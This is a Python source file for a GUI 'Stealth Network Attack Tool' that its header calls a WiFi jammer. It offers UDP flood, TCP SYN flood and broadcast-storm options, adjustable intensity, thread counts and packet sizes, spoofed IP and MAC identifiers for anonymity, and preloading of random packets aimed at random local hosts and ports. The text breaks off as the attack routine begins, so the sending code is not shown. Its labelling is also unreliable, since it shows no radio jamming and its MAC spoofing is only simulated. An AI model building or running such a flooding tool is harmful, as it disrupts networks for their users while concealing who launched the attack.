#!/usr/bin/env python3
"""
Stealth WiFi Jammer - Windows Edition
Single file, no external dependencies, maximum anonymity
For Red Team vs Blue Team competitions
"""

import tkinter as tk
from tkinter import ttk, messagebox
import socket
import random
import threading
import time
import subprocess
import os
import sys
import ctypes
import re
import struct
import platform

class StealthJammer(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Stealth Network Attack Tool - Windows Edition")
        
        # Set window to 90% of screen size
        screen_width = self.winfo_screenwidth()
        screen_height = self.winfo_screenheight()
        window_width = int(screen_width * 0.9)
        window_height = int(screen_height * 0.9)
        x = (screen_width - window_width) // 2
        y = (screen_height - window_height) // 2
        self.geometry(f"{window_width}x{window_height}+{x}+{y}")
        self.resizable(True, True)
        
        # Configure colors and theme
        self.bg_color = "#1e1e1e"
        self.fg_color = "#ffffff"
        self.accent_color = "#007acc"
        self.danger_color = "#e74c3c"
        self.success_color = "#2ecc71"
        self.warning_color = "#f39c12"
        
        self.configure(bg=self.bg_color)
        
        # Attack state
        self.attack_active = False
        self.intensity = 5
        self.attack_threads = []
        self.packets_sent = 0
        self.start_time = None
        self.bytes_sent = 0
        
        # Advanced customization settings
        self.packet_size_min = 512
        self.packet_size_max = 2048
        self.send_rate = 1000  # packets per second per thread
        self.burst_size = 10
        self.thread_multiplier = 5
        
        # Packet preloading
        self.preloaded_packets = []
        self.preload_count = 1000  # Number of packets to preload
        self.preload_enabled = True
        
        # Performance monitoring
        self.last_packet_count = 0
        self.last_byte_count = 0
        self.last_update_time = time.time()
        self.current_pps = 0  # packets per second
        self.current_bandwidth = 0  # bytes per second
        
        # Ping monitoring
        self.ping_target = "8.8.8.8"
        self.current_ping = 0
        self.ping_monitoring = False
        
        # Anonymity features
        self.mac_randomization = False
        self.traffic_obfuscation = True
        
        # Network info
        self.current_interface = None
        self.current_mac = None
        self.original_mac = None
        self.spoofed_ip = None
        self.spoofed_mac = None
        
        # Check for admin privileges
        self.is_admin = self.check_admin()
        
        self.build_ui()
        self.detect_network_interface()
        
        # Start monitoring
        self.update_stats()
        self.start_ping_monitor()
        
        self.protocol("WM_DELETE_WINDOW", self.on_destroy)
    
    def check_admin(self):
        """Check if running with admin privileges on Windows"""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            return False
    
    def build_ui(self):
        # Configure modern dark theme
        style = ttk.Style()
        style.theme_use('clam')
        
        # Configure ttk styles for dark theme
        style.configure('TFrame', background=self.bg_color)
        style.configure('TLabel', background=self.bg_color, foreground=self.fg_color)
        style.configure('TLabelframe', background=self.bg_color, foreground=self.fg_color)
        style.configure('TLabelframe.Label', background=self.bg_color, foreground=self.accent_color, font=('Segoe UI', 11, 'bold'))
        style.configure('TCheckbutton', background=self.bg_color, foreground=self.fg_color)
        style.configure('Header.TLabel', font=('Segoe UI', 24, 'bold'), foreground=self.accent_color)
        style.configure('Subheader.TLabel', font=('Segoe UI', 10), foreground='#cccccc')
        style.configure('Stat.TLabel', font=('Consolas', 12, 'bold'), foreground=self.success_color)
        style.configure('Warning.TLabel', font=('Segoe UI', 10, 'bold'), foreground=self.warning_color)
        
        # Main container - use grid for better control
        self.grid_rowconfigure(0, weight=1)
        self.grid_columnconfigure(0, weight=1)
        
        main_frame = ttk.Frame(self, padding=10)
        main_frame.grid(row=0, column=0, sticky='nsew')
        main_frame.grid_rowconfigure(1, weight=1)
        main_frame.grid_columnconfigure(0, weight=1)
        main_frame.grid_columnconfigure(1, weight=1)
        
        # Header Section
        header_frame = ttk.Frame(main_frame)
        header_frame.grid(row=0, column=0, columnspan=2, sticky='ew', pady=(0, 10))
        
        title_label = ttk.Label(header_frame, text="STEALTH NETWORK ATTACK TOOL", style='Header.TLabel')
        title_label.pack()
        
        subtitle_label = ttk.Label(header_frame, text="Red Team Edition - Authorized Testing Only", style='Subheader.TLabel')
        subtitle_label.pack()
        
        warning_frame = tk.Frame(header_frame, bg=self.danger_color, bd=0)
        warning_frame.pack(fill='x', pady=5)
        warning_label = tk.Label(warning_frame, text="WARNING: Red Team Mode Active - Maximum Stealth Engaged",
                                font=('Segoe UI', 10, 'bold'), fg='white', bg=self.danger_color, pady=5)
        warning_label.pack()
        
        # Left Column - Controls
        left_column = ttk.Frame(main_frame)
        left_column.grid(row=1, column=0, sticky='nsew', padx=(0, 5))
        left_column.grid_rowconfigure(3, weight=1)
        
        # Right Column - Statistics
        right_column = ttk.Frame(main_frame)
        right_column.grid(row=1, column=1, sticky='nsew', padx=(5, 0))
        right_column.grid_rowconfigure(2, weight=1)
        
        # === LEFT COLUMN CONTENT ===
        
        # Anonymity Controls
        anon_frame = ttk.LabelFrame(left_column, text="ANONYMITY CONTROLS", padding=15)
        anon_frame.grid(row=0, column=0, sticky='ew', pady=(0, 10))
        
        # MAC Randomization
        mac_frame = ttk.Frame(anon_frame)
        mac_frame.pack(fill='x', pady=5)
        ttk.Label(mac_frame, text="MAC Address Randomization", font=('Segoe UI', 10)).pack(side='left')
        self.mac_var = tk.BooleanVar(value=False)
        self.mac_switch = ttk.Checkbutton(mac_frame, variable=self.mac_var, command=self.on_mac_toggle)
        self.mac_switch.pack(side='right')
        
        self.mac_status = ttk.Label(anon_frame, text="Current MAC: Detecting...", font=('Consolas', 9))
        self.mac_status.pack(anchor='w', pady=2)
        
        mac_btn = tk.Button(anon_frame, text="Generate New MAC Now", command=self.on_randomize_mac_now,
                           bg=self.accent_color, fg='white', font=('Segoe UI', 9), relief='flat', cursor='hand2')
        mac_btn.pack(fill='x', pady=5)
        
        ttk.Separator(anon_frame, orient='horizontal').pack(fill='x', pady=10)
        
        # Packet Spoofing
        spoof_label = ttk.Label(anon_frame, text="IP/Port Spoofing: ALWAYS ACTIVE", font=('Segoe UI', 10, 'bold'))
        spoof_label.pack(anchor='w', pady=2)
        
        self.spoof_status = ttk.Label(anon_frame, text="Spoofed IP: Generating...", font=('Consolas', 9))
        self.spoof_status.pack(anchor='w', pady=2)
        
        # Traffic Obfuscation
        obfus_frame = ttk.Frame(anon_frame)
        obfus_frame.pack(fill='x', pady=5)
        ttk.Label(obfus_frame, text="Traffic Pattern Randomization", font=('Segoe UI', 10)).pack(side='left')
        self.obfus_var = tk.BooleanVar(value=True)
        self.obfus_switch = ttk.Checkbutton(obfus_frame, variable=self.obfus_var, command=self.on_obfuscation_toggle)
        self.obfus_switch.pack(side='right')
        
        # Attack Controls
        attack_frame = ttk.LabelFrame(left_column, text="ATTACK CONTROLS", padding=15)
        attack_frame.grid(row=1, column=0, sticky='ew', pady=(0, 10))
        
        # Attack toggle
        self.attack_button = tk.Button(attack_frame, text="START ATTACK",
                                      font=('Segoe UI', 14, 'bold'),
                                      bg=self.success_color, fg='white',
                                      command=self.on_attack_toggle,
                                      height=2, relief='flat', cursor='hand2')
        self.attack_button.pack(fill='x', pady=5)
        
        # Intensity presets
        preset_frame = ttk.Frame(attack_frame)
        preset_frame.pack(fill='x', pady=10)
        ttk.Label(preset_frame, text="Intensity Presets:", font=('Segoe UI', 10, 'bold')).pack(anchor='w', pady=5)
        
        preset_buttons = ttk.Frame(preset_frame)
        preset_buttons.pack(fill='x')
        
        for name, level in [("Low", 3), ("Medium", 5), ("High", 7), ("Maximum", 10)]:
            btn = tk.Button(preset_buttons, text=name, command=lambda l=level: self.on_preset_click(l),
                          bg='#2c2c2c', fg='white', font=('Segoe UI', 9), relief='flat', cursor='hand2')
            btn.pack(side='left', padx=2, expand=True, fill='x')
        
        # Custom intensity
        intensity_frame = ttk.Frame(attack_frame)
        intensity_frame.pack(fill='x', pady=10)
        
        intensity_header = ttk.Frame(intensity_frame)
        intensity_header.pack(fill='x')
        ttk.Label(intensity_header, text="Custom Intensity:", font=('Segoe UI', 10, 'bold')).pack(side='left')
        self.intensity_label = ttk.Label(intensity_header, text="Level 5 (50%)", font=('Segoe UI', 10, 'bold'),
                                        foreground=self.accent_color)
        self.intensity_label.pack(side='right')
        
        self.intensity_var = tk.IntVar(value=5)
        self.intensity_scale = ttk.Scale(intensity_frame, from_=1, to=10,
                                        variable=self.intensity_var,
                                        orient='horizontal',
                                        command=self.on_intensity_changed)
        self.intensity_scale.pack(fill='x', pady=5)
        
        # Attack vectors
        ttk.Label(attack_frame, text="Attack Vectors:", font=('Segoe UI', 10, 'bold')).pack(anchor='w', pady=(10, 5))
        
        vectors_frame = ttk.Frame(attack_frame)
        vectors_frame.pack(fill='x', padx=10)
        
        self.vector_udp_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(vectors_frame, text="UDP Flood", variable=self.vector_udp_var).pack(anchor='w', pady=3)
        
        self.vector_tcp_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(vectors_frame, text="TCP SYN Flood", variable=self.vector_tcp_var).pack(anchor='w', pady=3)
        
        self.vector_broadcast_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(vectors_frame, text="Broadcast Storm", variable=self.vector_broadcast_var).pack(anchor='w', pady=3)
        
        # Advanced Configuration
        advanced_frame = ttk.LabelFrame(left_column, text="ADVANCED CONFIGURATION", padding=15)
        advanced_frame.grid(row=2, column=0, sticky='ew', pady=(0, 10))
        
        # Packet Size Configuration
        ttk.Label(advanced_frame, text="Packet Size Control:", font=('Segoe UI', 10, 'bold')).pack(anchor='w', pady=(5, 2))
        
        size_container = ttk.Frame(advanced_frame)
        size_container.pack(fill='x', pady=5)
        
        size_min_frame = ttk.Frame(size_container)
        size_min_frame.pack(fill='x', pady=2)
        ttk.Label(size_min_frame, text="Min Size (bytes):", font=('Segoe UI', 9)).pack(side='left')
        self.packet_size_min_var = tk.IntVar(value=512)
        size_min_spin = tk.Spinbox(size_min_frame, from_=64, to=1048576, increment=64,
                                   textvariable=self.packet_size_min_var, font=('Consolas', 9),
                                   width=8, command=self.update_packet_size)
        size_min_spin.pack(side='right')
        
        size_max_frame = ttk.Frame(size_container)
        size_max_frame.pack(fill='x', pady=2)
        ttk.Label(size_max_frame, text="Max Size (bytes):", font=('Segoe UI', 9)).pack(side='left')
        self.packet_size_max_var = tk.IntVar(value=2048)
        size_max_spin = tk.Spinbox(size_max_frame, from_=64, to=1048576, increment=64,
                                   textvariable=self.packet_size_max_var, font=('Consolas', 9),
                                   width=8, command=self.update_packet_size)
        size_max_spin.pack(side='right')
        
        # Packet size presets
        size_preset_frame = ttk.Frame(advanced_frame)
        size_preset_frame.pack(fill='x', pady=5)
        ttk.Label(size_preset_frame, text="Size Presets:", font=('Segoe UI', 9)).pack(side='left', padx=(0, 5))
        
        size_preset_row1 = ttk.Frame(size_preset_frame)
        size_preset_row1.pack(fill='x', pady=2)
        
        for name, min_s, max_s in [("Tiny", 64, 256), ("Small", 256, 512), ("Medium", 512, 2048)]:
            btn = tk.Button(size_preset_row1, text=name, 
                          command=lambda m=min_s, x=max_s: self.set_packet_size_preset(m, x),
                          bg='#2c2c2c', fg='white', font=('Segoe UI', 8), relief='flat', cursor='hand2')
            btn.pack(side='left', padx=1, expand=True, fill='x')
        
        size_preset_row2 = ttk.Frame(size_preset_frame)
        size_preset_row2.pack(fill='x', pady=2)
        
        for name, min_s, max_s in [("Large", 2048, 8192), ("Huge", 8192, 65536), ("1 MB", 1048576, 1048576)]:
            btn = tk.Button(size_preset_row2, text=name, 
                          command=lambda m=min_s, x=max_s: self.set_packet_size_preset(m, x),
                          bg='#2c2c2c', fg='white', font=('Segoe UI', 8), relief='flat', cursor='hand2')
            btn.pack(side='left', padx=1, expand=True, fill='x')

        
        ttk.Separator(advanced_frame, orient='horizontal').pack(fill='x', pady=10)
        
        # Send Rate Configuration
        ttk.Label(advanced_frame, text="Send Rate Control:", font=('Segoe UI', 10, 'bold')).pack(anchor='w', pady=(5, 2))
        
        rate_frame = ttk.Frame(advanced_frame)
        rate_frame.pack(fill='x', pady=5)
        
        rate_header = ttk.Frame(rate_frame)
        rate_header.pack(fill='x')
        ttk.Label(rate_header, text="Packets/sec per thread:", font=('Segoe UI', 9)).pack(side='left')
        self.rate_value_label = ttk.Label(rate_header, text="1000", font=('Segoe UI', 9, 'bold'),
                                         foreground=self.accent_color)
        self.rate_value_label.pack(side='right')
        
        self.send_rate_var = tk.IntVar(value=1000)
        rate_scale = ttk.Scale(rate_frame, from_=100, to=10000, variable=self.send_rate_var,
                              orient='horizontal', command=self.update_send_rate)
        rate_scale.pack(fill='x', pady=2)
        
        # Rate presets
        rate_preset_frame = ttk.Frame(advanced_frame)
        rate_preset_frame.pack(fill='x', pady=5)
        ttk.Label(rate_preset_frame, text="Rate Presets:", font=('Segoe UI', 9)).pack(side='left', padx=(0, 5))
        
        for name, rate in [("Slow", 100), ("Normal", 1000), ("Fast", 5000), ("MAX", 10000)]:
            btn = tk.Button(rate_preset_frame, text=name,
                          command=lambda r=rate: self.send_rate_var.set(r) or self.update_send_rate(r),
                          bg='#2c2c2c', fg='white', font=('Segoe UI', 8), relief='flat', cursor='hand2')
            btn.pack(side='left', padx=1, expand=True, fill='x')
        
        ttk.Separator(advanced_frame, orient='horizontal').pack(fill='x', pady=10)
        
        # Burst Size Configuration
        ttk.Label(advanced_frame, text="Burst Size:", font=('Segoe UI', 10, 'bold')).pack(anchor='w', pady=(5, 2))
        
        burst_frame = ttk.Frame(advanced_frame)
        burst_frame.pack(fill='x', pady=5)
        
        burst_header = ttk.Frame(burst_frame)
        burst_header.pack(fill='x')
        ttk.Label(burst_header, text="Packets per burst:", font=('Segoe UI', 9)).pack(side='left')
        self.burst_value_label = ttk.Label(burst_header, text="10", font=('Segoe UI', 9, 'bold'),
                                          foreground=self.accent_color)
        self.burst_value_label.pack(side='right')
        
        self.burst_size_var = tk.IntVar(value=10)
        burst_scale = ttk.Scale(burst_frame, from_=1, to=100, variable=self.burst_size_var,
                               orient='horizontal', command=self.update_burst_size)
        burst_scale.pack(fill='x', pady=2)
        
        ttk.Separator(advanced_frame, orient='horizontal').pack(fill='x', pady=10)
        
        # Thread Multiplier
        ttk.Label(advanced_frame, text="Thread Multiplier:", font=('Segoe UI', 10, 'bold')).pack(anchor='w', pady=(5, 2))
        
        thread_frame = ttk.Frame(advanced_frame)
        thread_frame.pack(fill='x', pady=5)
        
        thread_header = ttk.Frame(thread_frame)
        thread_header.pack(fill='x')
        ttk.Label(thread_header, text="Threads per intensity:", font=('Segoe UI', 9)).pack(side='left')
        self.thread_value_label = ttk.Label(thread_header, text="5x", font=('Segoe UI', 9, 'bold'),
                                           foreground=self.accent_color)
        self.thread_value_label.pack(side='right')
        
        self.thread_multiplier_var = tk.IntVar(value=5)
        thread_scale = ttk.Scale(thread_frame, from_=1, to=20, variable=self.thread_multiplier_var,
                                orient='horizontal', command=self.update_thread_multiplier)
        thread_scale.pack(fill='x', pady=2)
        
        ttk.Separator(advanced_frame, orient='horizontal').pack(fill='x', pady=10)
        
        # Packet Preloading
        ttk.Label(advanced_frame, text="Packet Preloading:", font=('Segoe UI', 10, 'bold')).pack(anchor='w', pady=(5, 2))
        
        preload_enable_frame = ttk.Frame(advanced_frame)
        preload_enable_frame.pack(fill='x', pady=5)
        ttk.Label(preload_enable_frame, text="Enable Preloading", font=('Segoe UI', 9)).pack(side='left')
        self.preload_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(preload_enable_frame, variable=self.preload_var,
                       command=self.update_preload_setting).pack(side='right')
        
        preload_count_frame = ttk.Frame(advanced_frame)
        preload_count_frame.pack(fill='x', pady=2)
        ttk.Label(preload_count_frame, text="Preload Count:", font=('Segoe UI', 9)).pack(side='left')
        self.preload_count_var = tk.IntVar(value=1000)
        preload_spin = tk.Spinbox(preload_count_frame, from_=100, to=10000, increment=100,
                                 textvariable=self.preload_count_var, font=('Consolas', 9),
                                 width=8, command=self.update_preload_count)
        preload_spin.pack(side='right')
        
        preload_btn = tk.Button(advanced_frame, text="Preload Packets Now",
                               command=self.preload_packets_now,
                               bg=self.accent_color, fg='white', font=('Segoe UI', 9),
                               relief='flat', cursor='hand2')
        preload_btn.pack(fill='x', pady=5)
        
        self.preload_status = ttk.Label(advanced_frame, text="Packets ready: 0",
                                       font=('Consolas', 9), foreground=self.warning_color)
        self.preload_status.pack(anchor='w', pady=2)
        
        # Network Info
        network_frame = ttk.LabelFrame(left_column, text="NETWORK INFORMATION", padding=15)
        network_frame.grid(row=3, column=0, sticky='ew')
        
        self.network_label = ttk.Label(network_frame, text="Interface: Detecting...", font=('Consolas', 9))
        self.network_label.pack(anchor='w', pady=2)
        
        self.ping_target_frame = ttk.Frame(network_frame)
        self.ping_target_frame.pack(fill='x', pady=5)
        ttk.Label(self.ping_target_frame, text="Ping Target:", font=('Segoe UI', 9)).pack(side='left')
        self.ping_target_entry = tk.Entry(self.ping_target_frame, font=('Consolas', 9), width=15)
        self.ping_target_entry.insert(0, "8.8.8.8")
        self.ping_target_entry.pack(side='left', padx=5)
        self.ping_target_entry.bind('<Return>', lambda e: self.update_ping_target())
        
        admin_text = "Admin Rights: YES" if self.is_admin else "Admin Rights: NO (Limited)"
        admin_color = self.success_color if self.is_admin else self.danger_color
        self.admin_label = ttk.Label(network_frame, text=admin_text, font=('Segoe UI', 9, 'bold'),
                                    foreground=admin_color)
        self.admin_label.pack(anchor='w', pady=2)
        
        # === RIGHT COLUMN CONTENT ===
        
        # Real-time Statistics
        stats_frame = ttk.LabelFrame(right_column, text="REAL-TIME STATISTICS", padding=15)
        stats_frame.grid(row=0, column=0, sticky='ew', pady=(0, 10))
        
        # Status
        status_container = ttk.Frame(stats_frame)
        status_container.pack(fill='x', pady=5)
        ttk.Label(status_container, text="Status:", font=('Segoe UI', 10)).pack(side='left')
        self.status_label = ttk.Label(status_container, text="Idle", font=('Segoe UI', 10, 'bold'),
                                     foreground=self.warning_color)
        self.status_label.pack(side='left', padx=10)
        
        # Create stats grid
        stats_grid = ttk.Frame(stats_frame)
        stats_grid.pack(fill='x', pady=10)
        
        # Packets sent
        packets_frame = ttk.Frame(stats_grid)
        packets_frame.pack(fill='x', pady=3)
        ttk.Label(packets_frame, text="Packets Sent:", font=('Segoe UI', 10)).pack(side='left')
        self.packets_label = ttk.Label(packets_frame, text="0", style='Stat.TLabel')
        self.packets_label.pack(side='right')
        
        # Packet rate
        pps_frame = ttk.Frame(stats_grid)
        pps_frame.pack(fill='x', pady=3)
        ttk.Label(pps_frame, text="Packet Rate:", font=('Segoe UI', 10)).pack(side='left')
        self.rate_label = ttk.Label(pps_frame, text="0 pps", style='Stat.TLabel')
        self.rate_label.pack(side='right')
        
        # Bandwidth
        bandwidth_frame = ttk.Frame(stats_grid)
        bandwidth_frame.pack(fill='x', pady=3)
        ttk.Label(bandwidth_frame, text="Bandwidth:", font=('Segoe UI', 10)).pack(side='left')
        self.bandwidth_label = ttk.Label(bandwidth_frame, text="0 KB/s", style='Stat.TLabel')
        self.bandwidth_label.pack(side='right')
        
        # Data sent
        data_frame = ttk.Frame(stats_grid)
        data_frame.pack(fill='x', pady=3)
        ttk.Label(data_frame, text="Data Sent:", font=('Segoe UI', 10)).pack(side='left')
        self.data_label = ttk.Label(data_frame, text="0 KB", style='Stat.TLabel')
        self.data_label.pack(side='right')
        
        # Duration
        time_frame = ttk.Frame(stats_grid)
        time_frame.pack(fill='x', pady=3)
        ttk.Label(time_frame, text="Duration:", font=('Segoe UI', 10)).pack(side='left')
        self.time_label = ttk.Label(time_frame, text="0s", style='Stat.TLabel')
        self.time_label.pack(side='right')
        
        # Network Performance
        perf_frame = ttk.LabelFrame(right_column, text="NETWORK PERFORMANCE", padding=15)
        perf_frame.grid(row=1, column=0, sticky='ew', pady=(0, 10))
        
        # Ping
        ping_container = ttk.Frame(perf_frame)
        ping_container.pack(fill='x', pady=3)
        ttk.Label(ping_container, text="Ping:", font=('Segoe UI', 10)).pack(side='left')
        self.ping_label = ttk.Label(ping_container, text="Measuring...", style='Stat.TLabel')
        self.ping_label.pack(side='right')
        
        # Thread count
        threads_container = ttk.Frame(perf_frame)
        threads_container.pack(fill='x', pady=3)
        ttk.Label(threads_container, text="Active Threads:", font=('Segoe UI', 10)).pack(side='left')
        self.threads_label = ttk.Label(threads_container, text="0", style='Stat.TLabel')
        self.threads_label.pack(side='right')
        
        # Attack Log
        log_frame = ttk.LabelFrame(right_column, text="ACTIVITY LOG", padding=15)
        log_frame.grid(row=2, column=0, sticky='nsew')
        log_frame.grid_rowconfigure(0, weight=1)
        log_frame.grid_columnconfigure(0, weight=1)
        
        # Create scrolled text widget
        log_scroll = ttk.Scrollbar(log_frame)
        log_scroll.grid(row=0, column=1, sticky='ns')
        
        self.log_text = tk.Text(log_frame, height=15, bg='#0a0a0a', fg='#00ff00',
                               font=('Consolas', 9), wrap='word', yscrollcommand=log_scroll.set)
        self.log_text.grid(row=0, column=0, sticky='nsew')
        log_scroll.config(command=self.log_text.yview)
        
        self.log_message("System initialized", "INFO")
        self.log_message("Awaiting attack configuration...", "INFO")
    
    def log_message(self, message, level="INFO"):
        """Add message to activity log"""
        timestamp = time.strftime("%H:%M:%S")
        color_map = {
            "INFO": "#00ff00",
            "WARNING": "#ffff00",
            "ERROR": "#ff0000",
            "ATTACK": "#ff00ff"
        }
        
        self.log_text.insert('end', f"[{timestamp}] ", 'timestamp')
        self.log_text.insert('end', f"[{level}] ", level)
        self.log_text.insert('end', f"{message}\n")
        
        self.log_text.tag_config('timestamp', foreground='#888888')
        self.log_text.tag_config(level, foreground=color_map.get(level, '#00ff00'))
        
        self.log_text.see('end')
        
        # Limit log size
        if int(self.log_text.index('end-1c').split('.')[0]) > 500:
            self.log_text.delete('1.0', '100.0')
    
    def update_ping_target(self):
        """Update ping target from entry"""
        new_target = self.ping_target_entry.get().strip()
        if new_target:
            self.ping_target = new_target
            self.log_message(f"Ping target changed to {new_target}", "INFO")
    
    def start_ping_monitor(self):
        """Start ping monitoring in background"""
        self.ping_monitoring = True
        threading.Thread(target=self.ping_monitor_thread, daemon=True).start()
    
    def ping_monitor_thread(self):
        """Monitor ping in background"""
        while self.ping_monitoring:
            try:
                if platform.system().lower() == "windows":
                    result = subprocess.run(['ping', '-n', '1', '-w', '1000', self.ping_target],
                                          capture_output=True, text=True, timeout=2)
                    
                    # Parse ping result
                    if result.returncode == 0:
                        match = re.search(r'time[=<](\d+)ms', result.stdout)
                        if match:
                            self.current_ping = int(match.group(1))
                        else:
                            # Check for <1ms
                            if 'time<1ms' in result.stdout:
                                self.current_ping = 0
                            else:
                                self.current_ping = -1
                    else:
                        self.current_ping = -1
                else:
                    self.current_ping = -1
                    
            except:
                self.current_ping = -1
            
            time.sleep(2)  # Ping every 2 seconds
    
    def format_bytes(self, bytes_val):
        """Format bytes to human readable"""
        for unit in ['B', 'KB', 'MB', 'GB']:
            if bytes_val < 1024.0:
                return f"{bytes_val:.2f} {unit}"
            bytes_val /= 1024.0
        return f"{bytes_val:.2f} TB"
    
    def update_packet_size(self):
        """Update packet size settings"""
        self.packet_size_min = self.packet_size_min_var.get()
        self.packet_size_max = self.packet_size_max_var.get()
        
        # Ensure min <= max
        if self.packet_size_min > self.packet_size_max:
            self.packet_size_min_var.set(self.packet_size_max)
            self.packet_size_min = self.packet_size_max
        
        self.log_message(f"Packet size range: {self.packet_size_min}-{self.packet_size_max} bytes", "INFO")
    
    def set_packet_size_preset(self, min_size, max_size):
        """Set packet size preset"""
        self.packet_size_min_var.set(min_size)
        self.packet_size_max_var.set(max_size)
        self.update_packet_size()
    
    def update_send_rate(self, value):
        """Update send rate setting"""
        self.send_rate = int(float(value))
        self.rate_value_label.config(text=f"{self.send_rate}")
        self.log_message(f"Send rate: {self.send_rate} pps/thread", "INFO")
    
    def update_burst_size(self, value):
        """Update burst size setting"""
        self.burst_size = int(float(value))
        self.burst_value_label.config(text=f"{self.burst_size}")
        self.log_message(f"Burst size: {self.burst_size} packets", "INFO")
    
    def update_thread_multiplier(self, value):
        """Update thread multiplier setting"""
        self.thread_multiplier = int(float(value))
        self.thread_value_label.config(text=f"{self.thread_multiplier}x")
        self.log_message(f"Thread multiplier: {self.thread_multiplier}x", "INFO")
    
    def update_preload_setting(self):
        """Update preload enable/disable"""
        self.preload_enabled = self.preload_var.get()
        status = "enabled" if self.preload_enabled else "disabled"
        self.log_message(f"Packet preloading {status}", "INFO")
    
    def update_preload_count(self):
        """Update preload count"""
        self.preload_count = self.preload_count_var.get()
        self.log_message(f"Preload count: {self.preload_count} packets", "INFO")
    
    def preload_packets_now(self):
        """Preload packets into memory"""
        self.log_message("Preloading packets into memory...", "INFO")
        threading.Thread(target=self._preload_packets_thread, daemon=True).start()
    
    def _preload_packets_thread(self):
        """Thread to preload packets"""
        self.preloaded_packets = []
        
        for i in range(self.preload_count):
            # Generate random packet data
            size = random.randint(self.packet_size_min, self.packet_size_max)
            packet_data = bytes(random.getrandbits(8) for _ in range(size))
            
            # Store packet with metadata
            self.preloaded_packets.append({
                'data': packet_data,
                'size': size,
                'target': f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}",
                'port': random.randint(1, 65535)
            })
            
            # Update status every 100 packets
            if (i + 1) % 100 == 0:
                self.after(0, lambda count=i+1: self.preload_status.config(
                    text=f"Packets ready: {count}/{self.preload_count}"))
        
        total_bytes = sum(p['size'] for p in self.preloaded_packets)
        self.after(0, lambda: self.preload_status.config(
            text=f"Packets ready: {len(self.preloaded_packets)} ({self.format_bytes(total_bytes)})",
            foreground=self.success_color))
        self.after(0, lambda: self.log_message(
            f"Preloaded {len(self.preloaded_packets)} packets ({self.format_bytes(total_bytes)})", "INFO"))
    
    def detect_network_interface(self):
        """Detect active network interface on Windows"""
        try:
            # Get active network adapters using ipconfig
            result = subprocess.run(['ipconfig', '/all'], 
                                  capture_output=True, text=True, timeout=5)
            
            # Parse output to find active adapter
            lines = result.stdout.split('\n')
            current_adapter = None
            
            for i, line in enumerate(lines):
                # Look for adapter headers
                if 'adapter' in line.lower() and ':' in line:
                    current_adapter = line.split(':')[0].strip()
                
                # Look for MAC address (Physical Address)
                if 'Physical Address' in line and current_adapter:
                    mac_match = re.search(r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})', line)
                    if mac_match and not line.strip().endswith('N/A'):
                        self.current_interface = current_adapter
                        self.current_mac = mac_match.group(0).replace('-', ':')
                        if not self.original_mac:
                            self.original_mac = self.current_mac
                        break
            
            if not self.current_interface:
                # Fallback: just get first network adapter
                self.current_interface = "Default Network Adapter"
            
            self.generate_spoofed_identifiers()
            self.update_network_display()
            
        except Exception as e:
            print(f"Error detecting interface: {e}")
            self.current_interface = "Unknown"
            self.generate_spoofed_identifiers()
    
    def get_current_mac(self):
        """Get current MAC address on Windows"""
        if not self.current_mac:
            self.detect_network_interface()
    
    def generate_random_mac(self):
        """Generate random MAC address"""
        mac = [0x02,  # Locally administered
               random.randint(0x00, 0xff),
               random.randint(0x00, 0xff),
               random.randint(0x00, 0xff),
               random.randint(0x00, 0xff),
               random.randint(0x00, 0xff)]
        return ':'.join([f'{x:02x}' for x in mac])
    
    def generate_spoofed_identifiers(self):
        """Generate spoofed IP and MAC for packets"""
        self.spoofed_ip = f"{random.randint(10, 200)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        self.spoofed_mac = self.generate_random_mac()
        self.after(0, self.update_spoof_display)
    
    def update_network_display(self):
        """Update network info display"""
        if self.current_interface:
            self.network_label.config(text=f"Interface: {self.current_interface}")
            self.mac_status.config(text=f"Current MAC: {self.current_mac or 'Unknown'}")
    
    def update_spoof_display(self):
        """Update spoofing info display"""
        self.spoof_status.config(text=f"Spoofed IP: {self.spoofed_ip} | MAC: {self.spoofed_mac}")
    
    def on_mac_toggle(self):
        """Handle MAC randomization toggle"""
        self.mac_randomization = self.mac_var.get()
    
    def on_randomize_mac_now(self):
        """Randomize MAC address immediately (Windows)"""
        if not self.is_admin:
            messagebox.showerror("Admin Required",
                               "This feature requires administrator privileges.\n\n"
                               "Please run this program as Administrator.")
            return
        
        new_mac = self.generate_random_mac()
        
        response = messagebox.askyesno("Change MAC Address?",
            f"This will temporarily disconnect you from the network.\n\n"
            f"Interface: {self.current_interface}\n"
            f"Current MAC: {self.current_mac}\n"
            f"New MAC: {new_mac}\n\n"
            f"Note: Windows MAC changing requires third-party tools or registry edits.\n"
            f"This will simulate MAC spoofing at the packet level instead.")
        
        if response:
            # On Windows, we simulate MAC spoofing in packets rather than changing adapter MAC
            # which requires registry edits or third-party tools
            self.spoofed_mac = new_mac
            self.update_spoof_display()
            messagebox.showinfo("MAC Spoofing Enabled",
                              f"Packet-level MAC spoofing enabled with {new_mac}\n\n"
                              f"All attack packets will use this spoofed MAC address.")
    
    def change_mac_address(self, new_mac):
        """Simulate MAC address change on Windows (packet-level spoofing)"""
        # Windows MAC changing is complex and requires registry edits or third-party tools
        # Instead, we use the spoofed MAC in our attack packets
        self.spoofed_mac = new_mac
        self.after(0, self.update_spoof_display)
        self.after(0, lambda: messagebox.showinfo(
            "MAC Spoofing Active",
            f"Packet-level MAC spoofing activated: {new_mac}\n\n"
            f"Attack traffic will use this spoofed MAC."
        ))
    
    def on_obfuscation_toggle(self):
        """Handle traffic obfuscation toggle"""
        self.traffic_obfuscation = self.obfus_var.get()
    
    def on_preset_click(self, level):
        """Handle preset intensity clicks"""
        self.intensity_var.set(level)
        self.on_intensity_changed(None)
    
    def on_intensity_changed(self, event):
        """Handle intensity slider change"""
        self.intensity = int(self.intensity_var.get())
        percent = self.intensity * 10
        self.intensity_label.config(text=f"Level {self.intensity} ({percent}%)")
    
    def on_attack_toggle(self):
        """Toggle attack on/off"""
        if not self.attack_active:
            self.start_attack()
        else:
            self.stop_attack()
    
    def start_attack(self):
        """Start the attack"""
        self.attack_active = True
        self.start_time = time.time()
        self.packets_sent = 0
        self.bytes_sent = 0
        self.last_packet_count = 0
        self.last_byte_count = 0
        self.last_update_time = time.time()
        
